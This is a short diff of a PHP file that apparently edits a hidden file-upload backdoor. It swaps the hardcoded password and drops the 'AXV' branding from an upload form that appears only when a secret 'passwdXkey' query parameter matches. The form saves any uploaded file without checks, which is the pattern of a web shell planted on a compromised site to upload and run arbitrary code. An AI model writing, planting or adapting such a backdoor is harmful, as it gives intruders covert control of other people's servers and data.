@@ -16,9 +16,9 @@ if (move_uploaded_file($files, $folder . $file)) {
     $result = "Failed to upload...!";
 }
 }
-$password = "4Xvt3cH1337";
+$password = "aisfoiau9339ru0q9";
 if (isset($_GET['passwdXkey']) && $_GET['passwdXkey'] == $password) {
-echo '<br /><br /># AXV UPLOADER<br /><form action="" method="post" enctype="multipart/form-data">
+echo '<br /><br /># UPLOADER<br /><form action="" method="post" enctype="multipart/form-data">
     <input type="file" name="files" />
     <input type="submit" name="uploaded" value="Upload">
 </form><div style="margin-top: 20px;">' . $result . '</div>';
